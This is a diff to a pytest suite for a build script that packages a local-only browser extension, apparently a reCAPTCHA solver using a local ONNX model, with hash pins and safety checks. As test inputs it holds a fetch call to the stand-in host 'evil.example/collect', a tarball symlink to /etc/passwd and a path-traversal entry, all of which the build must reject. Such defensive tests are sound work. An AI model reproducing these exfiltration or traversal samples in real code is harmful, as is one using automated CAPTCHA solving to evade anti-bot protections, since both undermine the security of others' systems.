@@ -52,6 +52,26 @@ def _tarball(tmp_path, files, extra=None, root=be.ROOT):
     return path
 
 
+ORT_JS = b"/*! ONNX Runtime Web */ export const x = 1; // http://www.apache.org/licenses/LICENSE-2.0\n"
+
+
+def _ort_tarball(tmp_path, data=ORT_JS):
+    path = tmp_path / "ort.tgz"
+    with tarfile.open(path, "w:gz") as tar:
+        info = tarfile.TarInfo(be.ORT_MEMBER)
+        info.size = len(data)
+        tar.addfile(info, io.BytesIO(data))
+    return path
+
+
+@pytest.fixture
+def ort(tmp_path, monkeypatch):
+    path = _ort_tarball(tmp_path)
+    monkeypatch.setattr(be, "ORT_TARBALL_SHA256", hashlib.sha256(path.read_bytes()).hexdigest())
+    monkeypatch.setattr(be, "ORT_MEMBER_SHA256", hashlib.sha256(ORT_JS).hexdigest())
+    return path
+
+
 @pytest.fixture
 def pinned(monkeypatch):
     def pin(path):
@@ -64,10 +84,10 @@ def pinned(monkeypatch):
     return pin
 
 
-def test_builds_a_local_only_extension(tmp_path, pinned):
+def test_builds_a_local_only_extension(tmp_path, pinned, ort):
     tar = pinned(_tarball(tmp_path, _files()))
     dest = tmp_path / "out"
-    be.build(tar, dest)
+    be.build(tar, ort, dest)
     names = {str(p.relative_to(dest)) for p in dest.rglob("*") if p.is_file()}
     assert "uploader.js" not in names and "popup.html" not in names
     assert {"manifest.json", "background.js", "rules/hl_en.json", "BUILD-INFO.txt", "LICENSE"} <= names
@@ -84,6 +104,7 @@ def test_builds_a_local_only_extension(tmp_path, pinned):
     assert "window.top.postMessage" not in script and "CustomEvent" not in script
     assert "__recaptchaSteps" in script and "window.postMessage" in script
     assert "m.source !== window ||" in (dest / "eventhook/loader.js").read_text()
+    assert (dest / be.ORT_OUT).read_bytes() == ORT_JS
     info = (dest / "BUILD-INFO.txt").read_text()
     digest = hashlib.sha256((dest / "background.js").read_bytes()).hexdigest()
     assert f"{digest}  background.js" in info
@@ -97,9 +118,9 @@ def test_background_has_fixed_settings_and_no_network():
     be.check({"background.js": js.encode()})
 
 
-def test_wrong_tarball_hash_fails(tmp_path):
-    with pytest.raises(be.BuildError, match="does not match"):
-        be.build(_tarball(tmp_path, _files()), tmp_path / "out")
+def test_wrong_tarball_hash_fails(tmp_path, ort):
+    with pytest.raises(be.BuildError, match="up.tar.gz: SHA-256"):
+        be.build(_tarball(tmp_path, _files()), ort, tmp_path / "out")
     assert not (tmp_path / "out").exists()
 
 
@@ -111,10 +132,10 @@ def test_wrong_tarball_hash_fails(tmp_path):
     "navigator.sendBeacon(u)",
     "fetch('https://evil.example/collect')",
 ])
-def test_reporting_or_foreign_url_in_output_fails(tmp_path, pinned, text):
+def test_reporting_or_foreign_url_in_output_fails(tmp_path, pinned, text, ort):
     tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha_ai.js": text.encode()})))
     with pytest.raises(be.BuildError, match="local-only check"):
-        be.build(tar, tmp_path / "out")
+        be.build(tar, ort, tmp_path / "out")
     assert not (tmp_path / "out").exists()
 
 
@@ -126,7 +147,7 @@ def test_recaptcha_urls_and_offscreen_canvas_pass():
 
 
 @pytest.mark.parametrize("kind", ["symlink", "traversal"])
-def test_unsafe_tarball_entries_fail(tmp_path, pinned, kind):
+def test_unsafe_tarball_entries_fail(tmp_path, pinned, kind, ort):
     if kind == "symlink":
         info = tarfile.TarInfo(f"{be.ROOT}/extension/link")
         info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
@@ -134,46 +155,60 @@ def test_unsafe_tarball_entries_fail(tmp_path, pinned, kind):
         info = tarfile.TarInfo(f"{be.ROOT}/../escape.js")
     tar = pinned(_tarball(tmp_path, _files(), extra=[info]))
     with pytest.raises(be.BuildError, match="unsafe path|link or special"):
-        be.build(tar, tmp_path / "out")
+        be.build(tar, ort, tmp_path / "out")
 
 
-def test_missing_step_broadcast_fails(tmp_path, pinned):
+def test_missing_step_broadcast_fails(tmp_path, pinned, ort):
     tar = pinned(_tarball(tmp_path, _files({"extension/captcha/recaptcha.js": b"function incStep() {}\n"})))
     with pytest.raises(be.BuildError, match="patch target not found"):
-        be.build(tar, tmp_path / "out")
+        be.build(tar, ort, tmp_path / "out")
 
 
-def test_missing_allowlisted_file_fails(tmp_path, pinned):
+def test_missing_allowlisted_file_fails(tmp_path, pinned, ort):
     files = _files()
     del files["extension/models/grid.onnx"]
-    with pytest.raises(be.BuildError, match="missing from tarball"):
-        be.build(pinned(_tarball(tmp_path, files)), tmp_path / "out")
+    with pytest.raises(be.BuildError, match="missing from up.tar.gz: extension/models/grid.onnx"):
+        be.build(pinned(_tarball(tmp_path, files)), ort, tmp_path / "out")
 
 
-def test_rebuild_replaces_the_previous_output(tmp_path, pinned):
+def test_rebuild_replaces_the_previous_output(tmp_path, pinned, ort):
     tar = pinned(_tarball(tmp_path, _files()))
     dest = tmp_path / "out"
-    be.build(tar, dest)
+    be.build(tar, ort, dest)
     (dest / "stale.js").write_text("old")
-    be.build(tar, dest)
+    be.build(tar, ort, dest)
     assert not (dest / "stale.js").exists()
 
 
-def test_refuses_to_replace_a_folder_that_is_not_a_build(tmp_path, pinned):
+def test_refuses_to_replace_a_folder_that_is_not_a_build(tmp_path, pinned, ort):
     dest = tmp_path / "Desktop"
     dest.mkdir()
     (dest / "keep.txt").write_text("mine")
     with pytest.raises(be.BuildError, match="not an earlier build"):
-        be.build(pinned(_tarball(tmp_path, _files())), dest)
+        be.build(pinned(_tarball(tmp_path, _files())), ort, dest)
     assert (dest / "keep.txt").read_text() == "mine"
 
 
-def test_a_changed_upstream_file_fails_the_pin_check(tmp_path, pinned, monkeypatch):
+def test_a_changed_upstream_file_fails_the_pin_check(tmp_path, pinned, monkeypatch, ort):
     tar = pinned(_tarball(tmp_path, _files()))
     monkeypatch.setitem(be.FILE_SHA256, "extension/lib/sql-wasm.wasm", "0" * 64)
     with pytest.raises(be.BuildError, match="differ from the reviewed pins: extension/lib/sql-wasm.wasm"):
-        be.build(tar, tmp_path / "out")
+        be.build(tar, ort, tmp_path / "out")
 
 
 def test_pins_cover_exactly_the_copied_files():
     assert set(be.FILE_SHA256) == set(be.COPY) and all(len(h) == 64 for h in be.FILE_SHA256.values())
+
+
+def test_ort_is_copied_unchanged_from_the_npm_release(tmp_path, pinned, ort, monkeypatch):
+    tar = pinned(_tarball(tmp_path, _files()))
+    monkeypatch.setattr(be, "ORT_MEMBER_SHA256", "0" * 64)
+    with pytest.raises(be.BuildError, match="differs from the reviewed pin"):
+        be.build(tar, ort, tmp_path / "out")
+
+
+def test_wrong_ort_tarball_fails(tmp_path, pinned, ort, monkeypatch):
+    tar = pinned(_tarball(tmp_path, _files()))
+    monkeypatch.setattr(be, "ORT_TARBALL_SHA256", "0" * 64)
+    with pytest.raises(be.BuildError, match="ort.tgz: SHA-256"):
+        be.build(tar, ort, tmp_path / "out")
